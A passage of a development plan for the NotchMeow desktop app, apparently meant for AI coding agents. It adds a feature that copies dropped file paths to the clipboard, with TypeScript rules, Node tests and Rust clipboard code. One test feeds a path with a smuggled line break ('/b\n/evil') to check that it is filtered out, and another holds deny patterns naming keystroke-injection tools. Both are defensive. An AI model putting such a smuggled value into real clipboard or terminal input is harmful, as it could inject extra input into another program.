( cd windows && npm run check:claude 2>&1 | tail -1; npm run check:ai 2>&1 | tail -1 )
```

Expected: `All Claude Code UI checks passed`, `All AI UI checks passed`.

- [ ] **Step 3: Prove the order is pinned**

Moving the local answer after the message joins the conversation must fail the pin.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/views/chat.ts $'    if (answerLocally(text)) return;\n    Sound.play("send");' $'    Sound.play("send");' scripts/sidekick-tests/status.test.mjs )
```

Expected: `# fail 1`.

- [ ] **Step 4: Ask it in the chat**

In the browser there is no Rust: if the question were sent to a model the chat would show an error note ("not running inside NotchMeow"). It must show the card:

```bash
( cd .claude/checkpoints/f1-tauri && playwright-cli -s=f1 goto "http://127.0.0.1:14711/" > /dev/null; sleep 4; playwright-cli -s=f1 eval "(()=>{const nm=window.__nm; const ev=(n,x={})=>nm.hook({hook_event_name:n,session_id:'s1',cwd:'C:/work/app',...x}); ev('PostToolUse',{tool_name:'Edit',tool_input:{file_path:'C:/work/app/a.ts'}}); ev('PostToolUse',{tool_name:'Bash',tool_input:{command:'ls'}}); nm.island.alert('prompt'); return nm.State.view})()" | sed -n 2p; playwright-cli -s=f1 resize 760 420 > /dev/null; playwright-cli -s=f1 click ".chat-input" > /dev/null; playwright-cli -s=f1 type "What's Claude doing?" > /dev/null; playwright-cli -s=f1 press Enter > /dev/null; sleep 1; playwright-cli -s=f1 screenshot --filename=chat-status.png > /dev/null; echo chat-status.png )
```

Expected: `"prompt"`, `chat-status.png`.

Say what you saw: the question as a bubble, then **"Claude Code in app has run 2 steps, edited a.ts, and is still working."** with the grey caption **"From NotchMeow, on this computer"**, and **no error note**.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): what's Claude doing? answered on this computer, never in a conversation

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

## Checkpoint 2: a scripted run

The session copies these into `.claude/checkpoints/f1-tauri/`, sends the owner their paths, and waits:

1. `note-recap.png` again, and `chat-status.png`: the status card in the chat.
2. A run of all three in a row, from a fresh page: `__nm.run.recap()` (the recap), then, after OK, `__nm.run.loop()` (the nudge), then `window.__nm.island.alert("prompt")` and the question typed (the status card). Say what happened at each step and **what did not**: the nudge after the recap waited for its minute (the 60 s gap), the second nudge for the same session never came.

The owner's questions: are the recap's and the nudge's words what they wanted? Is the status card clear that it did not come from a model? Nothing proceeds until the owner replies.

---

# Stage 3: the drop, the local voice and the proofs

### Task 10: Drop on an agent's cat, the rules and the clipboard

**Agent: `nm-implementer-deep` (Sonnet 5.5, trigger 1: operating-system APIs).** The Win32 clipboard (`OpenClipboard`, `GlobalAlloc`, `SetClipboardData`: who owns the memory afterwards) and the GTK clipboard (the GTK main thread; a Wayland compositor may refuse a program that has no focus) are written without a compiler on this machine for either: the code below was checked against the `windows 0.61.3` sources and gtk 0.18's documented API; the compile is **owed to CI** (Windows) and to the Linux image.

**Files:**
- Create: `windows/src/sidekick/agentdrop.ts`, `windows/scripts/sidekick-tests/agentdrop.test.mjs`
- Modify: `windows/src-tauri/src/sidekick_presence.rs` (`clipboard_text_ok` and its test), `platform/windows.rs`, `platform/linux.rs`, `lib.rs` (`copy_text`), `windows/src-tauri/Cargo.toml` (**two more features of the `windows` crate: the owner's answer**)

**Interfaces:**
- Consumes: Task 1's `agentName`; `cat/display.ts`'s `isAgentPill`; Task 5's `sidekick_presence.rs`.
- Produces: `dropAgents(tasks, cast, live) → {agentId, cat}[]`, `MAX_CHIPS` (4), `agentCatAt(x, y, targets) → agentId | null`, `dropPoint(position, dpr, fallback)`, `pathsText(paths) → string | null`, `copiedLine(agentId)`, `NOT_COPIED_LINE`, `DROP_SLACK`, `DropTarget`, `CastView` (`agentdrop.ts`); Rust `clipboard_text_ok(&str)`, `CLIPBOARD_MAX_BYTES`, `platform::copy_text(&AppHandle, &str) → bool`, the command `copy_text`.

**The rules.** **One chip for each running agent** (the owner's answer): a pill that is Claude Code or an `agent_<tag>` (never an integration) with a live session in the ledger, in the island's order, at most four, **in every display mode** (One cat, A cat for each agent, Two cats); the chip wears the agent's coat where the cast gives one, else the big cat's. The big drop area is not a chip. **The clipboard text** is the file's original path: one path plain, several one per line, no quotes; a path with a line break or a NUL in it could not be told from the next and is left out. **The command refuses** an empty text, one over 32 KB and one with a NUL; it fills the clipboard and does **nothing else**: no paste, no keystroke, no other program is touched (a test scans the Rust files for the APIs that could).

- [ ] **Step 1: Write the test**

The chips in every display mode, the hit test (inside, the edge, a little off, nowhere, two overlapping, a point that is not a point), the drop point (physical pixels over the pixel ratio, or the last cursor), the clipboard text, and the honest lines (never "sent", "delivered", "attached" or "pasted").

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/agentdrop.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import { DROP_SLACK, MAX_CHIPS, NOT_COPIED_LINE, agentCatAt, copiedLine, dropAgents, dropPoint, pathsText } from "../../src/sidekick/agentdrop.ts";
import { castOf } from "../../src/cat/cast.ts";

const tasks = [
  { id: "integration_claude", state: "working", last: 5 },
  { id: "agent_gemini", state: "working", last: 4 },
  { id: "agent_antigravity", state: "idle", last: 3 },
  { id: "integration_github", state: "idle", last: 2 },
];
const castIn = (mode, focusId = "integration_claude") => castOf(mode, { tasks, focusId, mainCat: "shrimpy", pair: ["shrimpy", "momo"], agentCats: { integration_claude: "leo", agent_gemini: "oreo", agent_antigravity: "snow" } });
const live = ["integration_claude", "agent_gemini", "agent_antigravity", "integration_github"];

test("a chip for each running agent, in every display mode: Claude Code, Gemini CLI, Antigravity and any other tagged agent; never an integration, never an agent that is not running", () => {
  for (const mode of ["one", "perAgent", "two"]) {
    assert.deepEqual(dropAgents(tasks, castIn(mode), live).map((a) => a.agentId), ["integration_claude", "agent_gemini", "agent_antigravity"], mode);
    assert.deepEqual(dropAgents(tasks, castIn(mode), ["agent_gemini"]).map((a) => a.agentId), ["agent_gemini"], `${mode}: only the running one`);
    assert.deepEqual(dropAgents(tasks, castIn(mode), []), [], mode);
  }
  assert.deepEqual(dropAgents(tasks, castIn("one"), live).map((a) => a.cat), ["shrimpy", "shrimpy", "shrimpy"], "One cat: every cat wears the Main cat");
  assert.deepEqual(dropAgents(tasks, castIn("perAgent"), live).map((a) => a.cat), ["leo", "oreo", "snow"], "A cat for each agent: the agent's own coat, the focused agent's too");
  assert.deepEqual(dropAgents(tasks, castIn("two"), live).map((a) => a.agentId), ["integration_claude", "agent_gemini", "agent_antigravity"], "Two cats: cat 2's agent is one of them");
  assert.deepEqual(dropAgents(tasks, castIn("perAgent", "agent_gemini"), live).map((a) => a.agentId), ["integration_claude", "agent_gemini", "agent_antigravity"], "the focused agent is a chip too: the big cat is not drawn in the drop view");
});

test("at most four chips, an agent with no pill gets none, and a live ledger agent with no pill is not a chip", () => {
  const many = ["a", "b", "c", "d", "e"].map((t) => ({ id: `agent_${t}` }));
  assert.equal(dropAgents(many, castIn("one"), many.map((t) => t.id)).length, MAX_CHIPS);
  assert.deepEqual(dropAgents(tasks, castIn("one"), ["agent_codex"]), [], "live in the ledger, no pill on the island");
});

test("the cat under the point: inside, on the edge, a little outside, and nowhere; the first of two overlapping cats wins; a point that is not a point hits nothing", () => {
  const targets = [{ agentId: "a", rect: { x: 100, y: 50, w: 20, h: 20 } }, { agentId: "b", rect: { x: 110, y: 50, w: 20, h: 20 } }];
  assert.equal(agentCatAt(105, 60, targets), "a");
  assert.equal(agentCatAt(125, 60, targets), "b");
  assert.equal(agentCatAt(115, 60, targets), "a", "where they overlap, the first");
  assert.equal(agentCatAt(100, 50, targets), "a");
  assert.equal(agentCatAt(100 - DROP_SLACK, 50, targets), "a", "a little off is still the cat's");
  assert.equal(agentCatAt(100 - DROP_SLACK - 1, 50, targets), null);
  assert.equal(agentCatAt(300, 300, targets), null);
  for (const [x, y] of [[Number.NaN, 1], [1, Number.POSITIVE_INFINITY], [undefined, 1]]) assert.equal(agentCatAt(x, y, targets), null);
  assert.equal(agentCatAt(1, 1, []), null);
});

test("where a drop happened: physical pixels over the pixel ratio, or the last cursor position where the system gives none", () => {
  assert.deepEqual(dropPoint({ x: 300, y: 150 }, 1.5, { x: 9, y: 9 }), { x: 200, y: 100 });
  assert.deepEqual(dropPoint(undefined, 2, { x: 9, y: 9 }), { x: 9, y: 9 });
  assert.deepEqual(dropPoint({ x: Number.NaN, y: 1 }, 2, { x: 9, y: 9 }), { x: 9, y: 9 });
  assert.deepEqual(dropPoint({ x: 10, y: 10 }, 0, { x: 9, y: 9 }), { x: 9, y: 9 });
});

test("the clipboard text: one path plain, several one per line with no quotes; a path that could not be told from the next is left out; none left is null", () => {
  assert.equal(pathsText(["C:\\Users\\me\\a b.txt"]), "C:\\Users\\me\\a b.txt");
  assert.equal(pathsText(["/home/me/a.txt", "/home/me/b c.txt"]), "/home/me/a.txt\n/home/me/b c.txt");
  assert.equal(pathsText(["/a", "/b\n/evil", "", 7, null, "/c\0d", "/ok"]), "/a\n/ok");
  for (const none of [[], [""], "x", undefined, null, 7, {}]) assert.equal(pathsText(none), null, String(none));
});

test("the lines are honest: copied, never sent, delivered or attached", () => {
  assert.equal(copiedLine("integration_claude"), "Copied the path \u2014 paste it into Claude Code");
  assert.equal(copiedLine("agent_gemini"), "Copied the path \u2014 paste it into Gemini CLI");
  assert.equal(copiedLine("agent_antigravity"), "Copied the path \u2014 paste it into Antigravity");
  for (const line of [copiedLine("agent_gemini"), NOT_COPIED_LINE]) assert.doesNotMatch(line, /sent|delivered|attached|pasted/i);
});

EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: Write the rules**

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/agentdrop.ts <<'EOF'
// Dropping a file on an agent's own cat (sub-project F1, spec "Drop on an agent's cat"): the pure rules. The agent that cat stands for gets a path, not the file: the path goes to the
// clipboard, the agent's terminal or editor is brought forward where the system lets it, and the island says honestly what happened. Nothing is pasted, typed or sent to another program,
// no session is touched and the line never says "sent" or "delivered". The big drop area is never a target: a drop on it is the chat or Ask drop it always was. Pure; loaded by the plain-Node checks.

import { isAgentPill } from "../cat/display.ts";
import { agentName } from "./core.ts";

export interface Rect { x: number; y: number; w: number; h: number }

/** An agent's cat in the drop strip: whose it is, and where it is on the page (CSS px, the page's own coordinates). */
export interface DropTarget { agentId: string; rect: Rect }

/** The part of the cast a chip's coat is read from (cat/cast.ts). */
export interface CastView {
  big: { pill: string | null; cat: string };
  pills: readonly { pill: string; cat: string }[];
  second: { pill: string | null; cat: string } | null;
}

/** An agent a file can be dropped on, with the coat its chip wears. */
export interface DropAgent { agentId: string; cat: string }

/** At most this many chips: the island's pill row holds four. */
export const MAX_CHIPS = 4;

/**
 * The chips shown while a file is dragged over the island: **one for each running agent** (Claude Code, Gemini CLI, Antigravity, any other tagged agent), in the island's order, in every
 * display mode. "Running" is a live session in the ledger; an agent is a pill that is Claude Code or an `agent_<tag>`, never an integration. The chip wears the agent's coat where the cast gives
 * it one (the big cat's, a pill's, cat 2's), else the big cat's. The chips are an additive strip over the drop view: the big drop area is not one of them and does not move.
 */
export function dropAgents(tasks: readonly { id: string }[], cast: CastView, live: readonly string[]): DropAgent[] {
  const coat = new Map<string, string>();
  for (const p of cast.pills) coat.set(p.pill, p.cat);
  if (cast.big.pill) coat.set(cast.big.pill, cast.big.cat);
  if (cast.second?.pill) coat.set(cast.second.pill, cast.second.cat);
  return tasks
    .filter((t) => isAgentPill(t.id) && live.includes(t.id))
    .slice(0, MAX_CHIPS)
    .map((t) => ({ agentId: t.id, cat: coat.get(t.id) ?? cast.big.cat }));
}

/** How far outside a cat's rectangle a drop still counts (px): an aim that is a little off is still the cat's. */
export const DROP_SLACK = 4;

/** The agent whose cat is under the point, or null. The first target in the list wins where two overlap. */
export function agentCatAt(x: number, y: number, targets: readonly DropTarget[]): string | null {
  if (!Number.isFinite(x) || !Number.isFinite(y)) return null;
  for (const t of targets) {
    const r = t.rect;
    if (x >= r.x - DROP_SLACK && x <= r.x + r.w + DROP_SLACK && y >= r.y - DROP_SLACK && y <= r.y + r.h + DROP_SLACK) return t.agentId;
  }
  return null;
}

/**
 * Where a drop happened, in the page's CSS pixels: Tauri gives the position in physical pixels, so it is divided by the device pixel ratio. Where the system gives none (or a number that is
 * not one) the last cursor position the page knows is used.
 */
export function dropPoint(position: { x: number; y: number } | undefined, dpr: number, fallback: { x: number; y: number }): { x: number; y: number } {
  if (position && Number.isFinite(position.x) && Number.isFinite(position.y) && Number.isFinite(dpr) && dpr > 0) return { x: position.x / dpr, y: position.y / dpr };
  return fallback;
}

/**
 * What goes on the clipboard: one file is its plain path; several are one path per line, with no quotes. A path that is not text, is empty or has a line break or a NUL in it is left out
 * (it could not be told from the next path). Null when no path is left.
 */
export function pathsText(paths: unknown): string | null {
  const ok = (Array.isArray(paths) ? paths : []).filter((p): p is string => typeof p === "string" && p !== "" && !/[\0\r\n]/.test(p));
  return ok.length ? ok.join("\n") : null;
}

/** The line the island shows once the path is on the clipboard. It says copied, never sent. */
export const copiedLine = (agentId: string): string => `Copied the path \u2014 paste it into ${agentName(agentId)}`;

/** The line when it could not be: nothing was copied, and it says so. */
export const NOT_COPIED_LINE = "Couldn't copy the path.";
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 83`, `ℹ pass 83`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

- [ ] **Step 3: The clipboard, in Rust**

The pure check first (its test goes in `sidekick_presence.rs`), then the two platform functions and the command. `Cargo.toml` gains `Win32_System_DataExchange` and `Win32_System_Memory` (features of the crate that is already there: no new crate, no `Cargo.lock` change). The Windows function tries to open the clipboard five times (another program may hold it for a moment), writes UTF-16 text into movable global memory, and frees the memory itself if the system did not take it; the Linux one hands the work to the GTK main thread.

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src-tauri/src/sidekick_presence.rs", r'''#[cfg(test)]
mod tests {
    use super::*;
''', r'''/// The most a text put on the clipboard for the Sidekick may hold: the paths of the files dropped on an agent's cat, one per line. It is a few lines of paths, never a way to move data.
pub const CLIPBOARD_MAX_BYTES: usize = 32_768;

/// Whether a text may be put on the clipboard: not empty, not over `CLIPBOARD_MAX_BYTES`, and no NUL (a C string would end there, and the Windows clipboard's text is one).
pub fn clipboard_text_ok(text: &str) -> bool {
    !text.is_empty() && text.len() <= CLIPBOARD_MAX_BYTES && !text.contains('\0')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_a_short_text_without_a_nul_goes_on_the_clipboard() {
        assert!(clipboard_text_ok("C:\\work\\a.txt"));
        assert!(clipboard_text_ok("/home/me/a.txt\n/home/me/b.txt"));
        assert!(clipboard_text_ok(&"é".repeat(16_000)), "32000 bytes");
        assert!(!clipboard_text_ok(""));
        assert!(!clipboard_text_ok("a\0b"));
        assert!(!clipboard_text_ok(&"x".repeat(CLIPBOARD_MAX_BYTES + 1)));
        assert!(clipboard_text_ok(&"x".repeat(CLIPBOARD_MAX_BYTES)));
    }
''')
PY
```

```bash
windows/scripts/cargo-linux.sh test -p notchmeow only_a_short_text --target-dir /repo/windows/target/f1-tauri
```

Expected: `only_a_short_text_without_a_nul_goes_on_the_clipboard`, `test result: ok`.

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src-tauri/Cargo.toml", r'''  "Win32_System_Ole",
''', r'''  "Win32_System_DataExchange",
  "Win32_System_Memory",
  "Win32_System_Ole",
''')
edit("windows/src-tauri/src/platform/windows.rs", r'''/// Seconds since the last keyboard or mouse input of this session''', r'''/// Puts `text` on the clipboard as Unicode text (a path the user dropped on an agent's cat: the Sidekick copies it so they can paste it into that agent). True when it is there.
/// The clipboard may be held by another program for a moment, so opening it is tried a few times. Nothing is pasted anywhere: this only fills the clipboard.
pub fn copy_text(_app: &AppHandle, text: &str) -> bool {
    use ::windows::Win32::System::DataExchange::{CloseClipboard, EmptyClipboard, OpenClipboard, SetClipboardData};
    use ::windows::Win32::System::Memory::{GlobalAlloc, GlobalFree, GlobalLock, GlobalUnlock, GMEM_MOVEABLE};
    use ::windows::Win32::System::Ole::CF_UNICODETEXT;
    let wide: Vec<u16> = text.encode_utf16().chain(std::iter::once(0)).collect();
    // SAFETY: the clipboard is opened and closed in this function; the global memory is sized for `wide`, locked while it is written, and either owned by the system after
    // `SetClipboardData` succeeds or freed here when it did not.
    unsafe {
        let mut opened = false;
        for _ in 0..5 {
            if OpenClipboard(None).is_ok() {
                opened = true;
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(15));
        }
        if !opened {
            return false;
        }
        let mut ok = false;
        if EmptyClipboard().is_ok() {
            if let Ok(mem) = GlobalAlloc(GMEM_MOVEABLE, wide.len() * 2) {
                let dst = GlobalLock(mem) as *mut u16;
                if !dst.is_null() {
                    std::ptr::copy_nonoverlapping(wide.as_ptr(), dst, wide.len());
                    let _ = GlobalUnlock(mem);
                    ok = SetClipboardData(u32::from(CF_UNICODETEXT.0), Some(HANDLE(mem.0))).is_ok();
                }
                if !ok {
                    let _ = GlobalFree(Some(mem));
                }
            }
        }
        let _ = CloseClipboard();
        ok
    }
}

/// Seconds since the last keyboard or mouse input of this session''')
edit("windows/src-tauri/src/platform/linux.rs", r'''/// Seconds since the user's last input, from GNOME's idle monitor''', r'''/// Puts `text` on the clipboard (a path the user dropped on an agent's cat: the Sidekick copies it so they can paste it into that agent). The clipboard is the GTK main thread's, so the
/// work is handed to it; True when it was handed over. Nothing is pasted anywhere. (On a Wayland desktop a program that was not given the keyboard focus may be refused by the
/// compositor; the line the island shows after a drop says so when the copy did not happen.)
pub fn copy_text(app: &AppHandle, text: &str) -> bool {
    let text = text.to_string();
    app.run_on_main_thread(move || {
        let clipboard = gtk::Clipboard::get(&gtk::gdk::SELECTION_CLIPBOARD);
        clipboard.set_text(&text);
        clipboard.store();
    })
    .is_ok()
}

/// Seconds since the user's last input, from GNOME's idle monitor''')
edit("windows/src-tauri/src/lib.rs", r'''#[tauri::command]
fn quit_app(app: AppHandle) {''', r'''/// Puts a text on the clipboard: the paths of the files dropped on an agent's cat (the Sidekick, one per line). It fills the clipboard and nothing else: no paste, no keystroke, no other
/// program is touched. A text that is empty, too long or has a NUL is refused.
#[tauri::command]
fn copy_text(app: AppHandle, text: String) -> bool {
    sidekick_presence::clipboard_text_ok(&text) && platform::copy_text(&app, &text)
}

#[tauri::command]
fn quit_app(app: AppHandle) {''')
edit("windows/src-tauri/src/lib.rs", r'''            open_in_vscode,
            quit_app,''', r'''            open_in_vscode,
            copy_text,
            quit_app,''')
PY
```

```bash
windows/scripts/cargo-linux.sh test --workspace --target-dir /repo/windows/target/f1-tauri
```

Expected: `test result: ok`.

```bash
git diff --stat -- windows/Cargo.lock
```

`windows/Cargo.lock` is unchanged: the two features are not dependencies. (The command prints nothing.)

- [ ] **Step 4: Prove the paths and the chips bite**

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/agentdrop.ts 'typeof p === "string" && p !== "" && !/[\0\r\n]/.test(p)' 'typeof p === "string" && p !== ""' scripts/sidekick-tests/agentdrop.test.mjs )
```

Expected: `# fail 1`.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/agentdrop.ts '.filter((t) => isAgentPill(t.id) && live.includes(t.id))' '.filter((t) => live.includes(t.id))' scripts/sidekick-tests/agentdrop.test.mjs )
```

Expected: `# fail 1`.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src/sidekick/agentdrop.ts windows/src-tauri windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): drop on an agent's cat: the rules and the clipboard

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 11: Drop on an agent's cat, the island: the strip, the hand-over, the line

**The drop view has no cats of its own.** The moment a file is dragged over the island it expands to the drop view (the dashed frame and its own cat), which hides the overview's pills and the compact island's grid. **The owner's answer (2026-10-14): while a file is dragged, small chips for each running agent are shown on the drop view**: a strip at the right with a one-line hint, one chip per agent (Task 10's `dropAgents`), the chip under the pointer lit. It is **additive**: an absolutely placed element with no mouse of its own that exists only while a file is dragged, so the shipping drop view (`views/upload.ts`, its canvas, its card) and the big drop area, including G1's future Ask and Shelf halves, are not moved or changed (a test pins that `upload.ts` is untouched). A drop on a chip hands the path over; a drop anywhere else is the drop the island always had.

**Files:**
- Create: `windows/src/views/agentdrop.ts`
- Modify: `windows/src/island/island.ts` (the drop, the hover, `handoff`), `windows/src/island/hooks.ts` (an external agent's pill keeps its project folder), `windows/src/cat/minibots.ts` (`emoteMiniBots`), `windows/src/core/bridge.ts` (`copyText`, `position`), `windows/src/style.css`, `windows/scripts/sidekick-tests/agentdrop.test.mjs`

**Interfaces:**
- Consumes: Task 10's rules; Task 4's `Hub.sk.ledger.live`; Task 10's `copy_text`; `State.cast`; the island's note view (the line is shown the way the drop flow's own notes are).
- Produces: `class AgentDropStrip` (`el`, `show(agents)`, `hide()`, `targets()`, `hover(agentId | null)`); `Bridge.copyText(text)`; `DragDropPayload.position`; `emoteMiniBots(taskId, name)`.

**What happens on a drop on a chip:** the path goes to the clipboard (`Bridge.copyText`); on Windows the existing "Open terminal" action runs on the agent's project folder (`Bridge.openInVSCode(task.sessionCwd)`: VS Code, or the folder when `code` is not on `PATH`; the agent's `cwd` is kept in memory on its pill, as the Claude Code pill keeps its own, and is not in the ledger); on Linux **nothing is opened** (the owner's answer: the path is copied only); the agent's cat is happy; and one line shows for 2.4 s: **"Copied the path — paste it into {Agent}"**, or **"Couldn't copy the path."** when it was not (an empty path list, a refused clipboard). The line never says "sent", "delivered" or "attached", and nothing is pasted, typed or sent to another app; no session is touched. **Where the pointer was:** Tauri gives the drop's position in physical pixels (divided by the pixel ratio); where it gives none the island's own last cursor position is used.

- [ ] **Step 1: Write the wiring pins**

They are appended to Task 10's test file: the agent-cat test comes before every other drop rule and ends the drop there (no ingest, no chat, no upload sequence); the hand-over copies, runs "Open terminal" on Windows only, makes the cat happy and shows the honest line; no keystroke API appears in the Rust files or the hand-over; the big cat is not in the rules.

```bash
cat >> windows/scripts/sidekick-tests/agentdrop.test.mjs <<'EOF'

// ── The wiring: where the island and Rust call these rules ────────────────────────────────────────────────────────────────────────────────

import fs from "node:fs";
import { source } from "./util.mjs";
const rust = (rel) => fs.readFileSync(new URL(`../../src-tauri/src/${rel}`, import.meta.url), "utf8");

test("the island tests the agent cats first on a drop, the big drop area is never a chip, and a drop anywhere else is the old drop", () => {
  const island = source("island/island.ts");
  const drop = island.slice(island.indexOf('      case "drop": {'), island.indexOf("this.whenCatIsHere(() => this.swallow(path));"));
  assert.ok(drop.includes("const agent = this.agentUnder(e.position);"), "the agent cat's test is there");
  assert.ok(drop.indexOf("const agent = this.agentUnder(e.position);") < drop.indexOf("const path = e.paths?.[0];"), "the agent cat's test comes before every other drop rule");
  assert.ok(drop.indexOf("if (agent !== null) {") < drop.indexOf("const path = e.paths?.[0];"));
  assert.match(drop, /this\.handoff\(agent, e\.paths\);\s*break;/, "a drop on an agent's cat ends there: no ingest, no chat, no upload sequence");
  assert.doesNotMatch(drop.slice(drop.indexOf("if (agent !== null) {"), drop.indexOf("State.fileDragOver = false;\n        const path")), /swallow|ingestFile|whenCatIsHere/);
  assert.match(island, /this\.agentDrops\.show\(dropAgents\(State\.tasks, State\.cast, Hub\.sk\?\.ledger\.live\.map\(\(s\) => s\.agentId\) \?\? \[\]\)\);/);
  assert.doesNotMatch(source("sidekick/agentdrop.ts"), /bigCat|botCircle|upload/i, "the big drop area is not in the rules");
});

test("the handoff copies a path and, on Windows only, uses the existing Open terminal action; it never pastes, types or sends", () => {
  const island = source("island/island.ts");
  const handoff = island.slice(island.indexOf("  private handoff("), island.indexOf("  private onDragDrop("));
  assert.match(handoff, /Bridge\.copyText\(text\)/);
  assert.match(handoff, /if \(platformName\(\) === "windows"\) void Bridge\.openInVSCode\(State\.tasks\.find\(\(t\) => t\.id === agentId\)\?\.sessionCwd \?\? null\);/);
  assert.match(handoff, /emoteMiniBots\(agentId, "happy"\);/);
  assert.match(handoff, /show\(copiedLine\(agentId\)\)/);
  for (const bad of [/chatReset|aiChat|ingestFile|resume/, /keybd|SendInput|xdotool|wtype|enigo|paste/i]) assert.doesNotMatch(handoff, bad);
  const rs = ["lib.rs", "platform/windows.rs", "platform/linux.rs", "sidekick.rs"].map(rust).join("\n");
  assert.doesNotMatch(rs, /SendInput|keybd_event|xdotool|wtype|enigo|SetForegroundWindow.*claude/i, "no keystroke, no paste, no other program's window is touched by this feature");
  assert.match(rust("lib.rs"), /fn copy_text\(app: AppHandle, text: String\) -> bool \{\s*sidekick_presence::clipboard_text_ok\(&text\) && platform::copy_text\(&app, &text\)/);
  assert.match(rust("platform/windows.rs"), /pub fn copy_text\(_app: &AppHandle, text: &str\) -> bool/);
  assert.match(rust("platform/linux.rs"), /pub fn copy_text\(app: &AppHandle, text: &str\) -> bool/);
  assert.match(rust("../Cargo.toml"), /"Win32_System_DataExchange",\s*"Win32_System_Memory",/);
  assert.match(source("core/bridge.ts"), /copyText: \(text: string\) => call<boolean>\("copy_text", \{ text \}\)/);
});

test("an external agent's pill keeps its project folder for Open terminal, in memory and nowhere else", () => {
  const hooks = source("island/hooks.ts");
  assert.match(hooks, /const pill = State\.tasks\.find\(\(x\) => x\.id === agentId\);\s*if \(pill && cwd\) pill\.sessionCwd = cwd;/);
});

test("the strip is additive: the shipping drop view is not changed, the strip floats over it, takes no mouse of its own and shows only while a file is dragged", () => {
  assert.doesNotMatch(source("views/upload.ts"), /agent|chip|ad-/i, "the drop view's own file is untouched by this feature");
  const css = source("style.css");
  const rule = css.slice(css.indexOf("#agent-drops {"), css.indexOf("#agent-drops.on"));
  assert.match(rule, /position: absolute;/);
  assert.match(rule, /pointer-events: none;/);
  assert.match(rule, /display: none;/);
  const island = source("island/island.ts");
  assert.ok(island.indexOf("this.agentDrops.hide();") > 0);
  assert.match(island, /case "leave": \{[\s\S]*this\.agentDrops\.hide\(\);/);
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "wiring|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `✖`.

- [ ] **Step 2: Write the strip and the edits**

```bash
mkdir -p windows/src/views
cat > windows/src/views/agentdrop.ts <<'EOF'
// The agents' cats while a file is dragged over the island (sub-project F1, spec "Drop on an agent's cat"). The drop view has no cats of its own, so a small strip is added to it, only
// while a file is on its way and only when there is an agent a path could be handed to: one chip per running agent that has a cat of its own in this display mode. Dropping on a chip copies the
// file's path; dropping anywhere else is the drop the island always had. Pure DOM, no timer of its own: the island shows it and hides it, and moves the highlight with the cursor it already has.

import { createMiniBot, pruneMiniBots } from "../cat/minibots";
import { State } from "../core/state";
import { agentName } from "../sidekick/core.ts";
import type { DropAgent, DropTarget } from "../sidekick/agentdrop.ts";
import { clear, h } from "./dom";

export class AgentDropStrip {
  readonly el = h("div", { id: "agent-drops" });
  private chips = new Map<string, HTMLElement>();

  /** Shows one chip per agent. With none, nothing is shown. */
  show(agents: readonly DropAgent[]): void {
    this.hide();
    const chips: HTMLElement[] = [];
    for (const a of agents) {
      const task = State.tasks.find((t) => t.id === a.agentId);
      if (!task) continue;
      const chip = h("div", { class: "ad-chip" }, createMiniBot(task, 20, a.cat), h("span", { text: agentName(a.agentId) }));
      this.chips.set(a.agentId, chip);
      chips.push(chip);
    }
    if (!chips.length) return;
    this.el.append(h("div", { class: "ad-hint", text: "Drop on a cat to copy the path" }), ...chips);
    this.el.classList.add("on");
  }

  hide(): void {
    this.el.classList.remove("on");
    clear(this.el);
    this.chips.clear();
    pruneMiniBots();
  }

  /** Where the chips are on the page now. */
  targets(): DropTarget[] {
    const out: DropTarget[] = [];
    for (const [agentId, chip] of this.chips) {
      const r = chip.getBoundingClientRect();
      out.push({ agentId, rect: { x: r.left, y: r.top, w: r.width, h: r.height } });
    }
    return out;
  }

  /** Lights the chip of the agent whose cat the pointer is over (null: none). */
  hover(agentId: string | null): void {
    for (const [id, chip] of this.chips) chip.classList.toggle("hot", id === agentId);
  }
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/core/bridge.ts", r'''  // ── The Sidekick (sub-project F1) ──
''', r'''  // ── The Sidekick (sub-project F1) ──
  /** Fills the clipboard with a text (the paths of the files dropped on an agent's cat). True when it is there. Nothing is pasted anywhere. */
  copyText: (text: string) => call<boolean>("copy_text", { text }),
''')
edit("windows/src/core/bridge.ts", r'''export interface DragDropPayload {
  type: "enter" | "over" | "drop" | "leave";
  paths?: string[];
}''', r'''export interface DragDropPayload {
  type: "enter" | "over" | "drop" | "leave";
  paths?: string[];
